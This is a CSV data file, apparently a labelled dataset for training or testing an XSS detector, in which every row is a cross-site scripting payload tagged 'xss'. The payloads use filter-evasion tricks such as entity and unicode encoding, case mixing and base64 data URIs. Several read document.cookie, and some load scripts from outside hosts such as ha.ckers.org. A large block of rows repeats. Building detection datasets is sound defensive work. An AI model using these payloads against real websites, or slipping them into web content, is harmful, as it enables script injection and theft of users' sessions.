payload,label
"&#00;</form><input type&#61;""date"" onfocus=""alert(1)"">",xss
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>,xss
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/,xss
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>,xss
"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",xss
<script ~~~>alert(0%0)</script ~~~>,xss
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>,xss
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN,xss
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1),xss
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>',xss
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera},xss
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^,xss
"<div/style=""width:expression(confirm(1))"">X</div> {IE7}",xss
<iframe/%00/ src=javaSCRIPT&colon;alert(1),xss
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//,xss
"/*iframe/src*/<iframe/src=""<iframe/src=@""/onload=prompt(1) /*iframe/src*/>",xss
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\,xss
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>,xss
"<a/href=""javascript:&#13; javascript:prompt(1)""><input type=""X"">",xss
</plaintext\></|\><plaintext/onmouseover=prompt(1),xss
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera},xss
"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",xss
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,xss
"<iframe style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",xss
"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",xss
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",xss
"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",xss
"<var onmouseover=""prompt(1)"">On Mouse Over</var>",xss
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,xss
"<img src=""/"" =_="" title=""onerror='prompt(1)'"">",xss
<%<!--'%><script>alert(1);</script -->,xss
"<script src=""data:text/javascript,alert(1)""></script>",xss
<iframe/src \/\/onload = prompt(1),xss
<iframe/onreadystatechange=alert(1),xss
<svg/onload=alert(1),xss
<input value=<><iframe/src=javascript:confirm(1),xss
"<input type=""text"" value=`` <div/onmouseover='alert(1)'>X</div>",xss
http://www.<script>alert(1)</script .com,xss
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>,xss
<svg><script ?>alert(1),xss
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,xss
<img src=`xx:xx`onerror=alert(1)>,xss
"<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>",xss
"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>",xss
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss
"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>",xss
<svg contentScriptType=text/vbs><script>MsgBox+1,xss
"<a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>"">X</a",xss
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>,xss
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,xss
"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F",xss
"<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script",xss
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,xss
<script>+-+-1-+-+alert(1)</script>,xss
<body/onload=&lt;!--&gt;&#10alert(1)>,xss
<script itworksinallbrowsers>/*<script* */alert(1)</script,xss
<img src ?itworksonchrome?\/onerror = alert(1),xss
<svg><script>//&NewLine;confirm(1);</script </svg>,xss
<svg><script onlypossibleinopera:-)> alert(1),xss
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,xss
<script x> alert(1) </script 1=2,xss
"<div/onmouseover='alert(1)'> style=""x:"">",xss
<--`<img/src=` onerror=alert(1)> --!>,xss
"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>",xss
"<div style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>",xss
"""><img src=x onerror=window.open('https://www.google.com/');>",xss
<form><button formaction=javascript&colon;alert(1)>CLICKME,xss
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss
"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>",xss
"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",xss
"<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click Me</a>",xss
‘; alert(1);,xss
‘)alert(1);//,xss
<ScRiPt>alert(1)</sCriPt>,xss
<IMG SRC=jAVasCrIPt:alert(‘XSS’)>,xss
<IMG SRC=”javascript:alert(‘XSS’);”>,xss
<IMG SRC=javascript:alert(&quot;XSS&quot;)>,xss
<IMG SRC=javascript:alert(‘XSS’)>,xss
<img src=xss onerror=alert(1)>,xss
"<iframe %00 src=""&Tab;javascript:prompt(1)&Tab;""%00>",xss
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>',xss
"<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;""",xss
<sVg><scRipt %00>alert&lpar;1&rpar; {Opera},xss
<img/src=`%00` onerror=this.onerror=confirm(1),xss
"<form><isindex formaction=""javascript&colon;confirm(1)""",xss
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;,xss
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>,xss
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?,xss
"<iframe/src=""data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="">",xss
<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/,xss
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00,xss
"<iframe/src=""data:text/html,<svg &#111;&#110;load=alert(1)>"">",xss
"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>",xss
"<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script",xss
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera},xss
"<meta http-equiv=""refresh"" content=""0;url=javascript:confirm(1)"">",xss
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>,xss
"<form><a href=""javascript:\u0061lert&#x28;1&#x29;"">X",xss
"</script><img/*%00/src=""worksinchrome&colon;prompt&#x28;1&#x29;""/%00*/onerror='eval(src)'>",xss
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>,xss
"<form><iframe &#09;&#10;&#11; src=""javascript&#58;alert(1)""&#11;&#10;&#09;;>",xss
"<a href=""data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""&#09;&#10;&#11;>X</a",xss
http://www.google<script .com>alert(document.location)</script,xss
"<a&#32;href&#61;&#91;&#00;&#93;""&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;"">XYZ</a",xss
<img/src=@&#32;&#13; onerror = prompt('&#49;'),xss
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;,xss
<script ^__^>alert(String.fromCharCode(49))</script ^__^,xss
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(,xss
"&#00;</form><input type&#61;""date"" onfocus=""alert(1)"">",xss
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>,xss
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/,xss
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>,xss
"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",xss
<script ~~~>alert(0%0)</script ~~~>,xss
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>,xss
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN,xss
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1),xss
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>',xss
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera},xss
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^,xss
"<div/style=""width:expression(confirm(1))"">X</div> {IE7}",xss
<iframe/%00/ src=javaSCRIPT&colon;alert(1),xss
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//,xss
"/*iframe/src*/<iframe/src=""<iframe/src=@""/onload=prompt(1) /*iframe/src*/>",xss
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\,xss
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>,xss
"<a/href=""javascript:&#13; javascript:prompt(1)""><input type=""X"">",xss
</plaintext\></|\><plaintext/onmouseover=prompt(1),xss
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera},xss
"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",xss
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,xss
"<iframe style=""xg-p:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",xss
"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",xss
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",xss
"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",xss
"<var onmouseover=""prompt(1)"">On Mouse Over</var>",xss
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,xss
"<img src=""/"" =_="" title=""onerror='prompt(1)'"">",xss
<%<!--'%><script>alert(1);</script -->,xss
"<script src=""data:text/javascript,alert(1)""></script>",xss
<iframe/src \/\/onload = prompt(1),xss
<iframe/onreadystatechange=alert(1),xss
<svg/onload=alert(1),xss
<input value=<><iframe/src=javascript:confirm(1),xss
"<input type=""text"" value=`` <div/onmouseover='alert(1)'>X</div>",xss
http://www.<script>alert(1)</script .com,xss
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>,xss
<svg><script ?>alert(1),xss
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,xss
<img src=`xx:xx`onerror=alert(1)>,xss
"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>",xss
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss
"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>",xss
<svg contentScriptType=text/vbs><script>MsgBox+1,xss
"<a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>"">X</a",xss
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>,xss
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,xss
"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F",xss
"<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script",xss
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,xss
<script>+-+-1-+-+alert(1)</script>,xss
<body/onload=&lt;!--&gt;&#10alert(1)>,xss
<script itworksinallbrowsers>/*<script* */alert(1)</script,xss
<img src ?itworksonchrome?\/onerror = alert(1),xss
<svg><script>//&NewLine;confirm(1);</script </svg>,xss
<svg><script onlypossibleinopera:-)> alert(1),xss
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,xss
<script x> alert(1) </script 1=2,xss
"<div/onmouseover='alert(1)'> style=""x:"">",xss
<--`<img/src=` onerror=alert(1)> --!>,xss
"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>",xss
"<div style=""xg-p:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>",xss
"""><img src=x onerror=window.open('https://www.google.com/');>",xss
<form><button formaction=javascript&colon;alert(1)>CLICKME,xss
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss
"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>",xss
"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",xss
"<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click Me</a>",xss
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",xss
"‘;alert(String.fromCharCode(88,83,83))//’;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//–></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",xss
<IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>”>,xss
"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",xss
<IMG SRC=”jav ascript:alert(‘XSS’);”>,xss
<IMG SRC=”jav&#x09;ascript:alert(‘XSS’);”>,xss
<<SCRIPT>alert(“XSS”);//<</SCRIPT>,xss
%253cscript%253ealert(1)%253c/script%253e,xss
“><s”%2b”cript>alert(document.cookie)</script>,xss
foo<script>alert(1)</script>,xss
<scr<script>ipt>alert(1)</scr</script>ipt>,xss
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,xss
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,xss
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,xss
<BODY BACKGROUND=”javascript:alert(‘XSS’)”>,xss
<BODY ONLOAD=alert(‘XSS’)>,xss
<INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”>,xss
<IMG SRC=”javascript:alert(‘XSS’)”,xss
<iframe src=http://ha.ckers.org/scriptlet.html <,xss
"javascript:alert(""hellox worldss"")",xss
"<img src=""javascript:alert('XSS');"">",xss
<img src=javascript:alert(&quot;XSS&quot;)>,xss
"<""';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",xss
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",xss
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",xss
"<EMBED SRC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""></EMBED>",xss
"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",xss
"<""';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",xss
"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search",xss
"<script>alert(""hellox worldss"")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510",xss
"<script>alert(""XSS"");</script>&search=1",xss
"0&q=';alert(String.fromCharCode(88,83,83))//\';alert%2?8String.fromCharCode(88,83,83))//"";alert(String.fromCharCode?(88,83,83))//\"";alert(String.fromCharCode(88,83,83)%?29//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search",xss
<h1><font color=blue>hellox worldss</h1>,xss
<BODY ONLOAD=alert('hellox worldss')>,xss
<input onfocus=write(XSS) autofocus>,xss
<input onblur=write(XSS) autofocus><input autofocus>,xss
<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>,xss
"<form><button formaction=""javascript:alert(XSS)"">lol",xss
"<!--<img src=""--><img src=x onerror=alert(XSS)//"">",xss
"<![><img src=""]><img src=x onerror=alert(XSS)//"">",xss
"<style><img src=""</style><img src=x onerror=alert(XSS)//"">",xss
"<? foo=""><script>alert(1)</script>"">",xss
"<! foo=""><script>alert(1)</script>"">",xss
"</ foo=""><script>alert(1)</script>"">",xss
"<? foo=""><x foo='?><script>alert(1)</script>'>"">",xss
"<! foo=""[[[Inception]]""><x foo=""]foo><script>alert(1)</script>"">",xss
"<% foo><x foo=""%><script>alert(123)</script>"">",xss
"<div style=""font-family:'foo&#10;;color:red;';"">LOL",xss
"LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>",xss
<script>({0:#0=alert/#0#/#0#(0)})</script>,xss
"<svg xmlns=""http://www.w3.org/2000/svg"">LOL<script>alert(123)</script></svg>",xss
&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;,xss
"\\"";alert('XSS');//",xss
"&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\""XSS\"");&lt;/SCRIPT&gt;",xss
"&lt;INPUT TYPE=\""IMAGE\"" SRC=\""javascript&#058;alert('XSS');\""&gt;",xss
"&lt;BODY BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;",xss
&lt;BODY ONLOAD=alert('XSS')&gt;,xss
"&lt;IMG DYNSRC=\""javascript&#058;alert('XSS')\""&gt;",xss
"&lt;IMG LOWSRC=\""javascript&#058;alert('XSS')\""&gt;",xss
"&lt;BGSOUND SRC=\""javascript&#058;alert('XSS');\""&gt;",xss
"&lt;BR SIZE=\""&{alert('XSS')}\""&gt;",xss
"&lt;LAYER SRC=\""http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\""&gt;&lt;/LAYER&gt;",xss
"&lt;LINK REL=\""stylesheet\"" HREF=\""javascript&#058;alert('XSS');\""&gt;",xss
"&lt;LINK REL=\""stylesheet\"" HREF=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;css\""&gt;",xss
&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;,xss
"&lt;META HTTP-EQUIV=\""Link\"" Content=\""&lt;http&#58;//ha&#46;ckers&#46;org/xss&#46;css&gt;; REL=stylesheet\""&gt;",xss
"&lt;STYLE&gt;BODY{-moz-binding&#58;url(\""http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\"")}&lt;/STYLE&gt;",xss
"&lt;XSS STYLE=\""behavior&#58; url(xss&#46;htc);\""&gt;",xss
"&lt;STYLE&gt;li {list-style-image&#58; url(\""javascript&#058;alert('XSS')\"");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS",xss
"&lt;IMG SRC='vbscript&#058;msgbox(\""XSS\"")'&gt;",xss
"&lt;IMG SRC=\""mocha&#58;&#91;code&#93;\""&gt;",xss
"&lt;IMG SRC=\""livescript&#058;&#91;code&#93;\""&gt;",xss
žscriptualert(EXSSE)ž/scriptu,xss
"&lt;META HTTP-EQUIV=\""refresh\"" CONTENT=\""0;url=javascript&#058;alert('XSS');\""&gt;",xss
"&lt;META HTTP-EQUIV=\""refresh\"" CONTENT=\""0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\""&gt;",xss
"&lt;META HTTP-EQUIV=\""refresh\"" CONTENT=\""0; URL=http&#58;//;URL=javascript&#058;alert('XSS');\""",xss
"&lt;IFRAME SRC=\""javascript&#058;alert('XSS');\""&gt;&lt;/IFRAME&gt;",xss
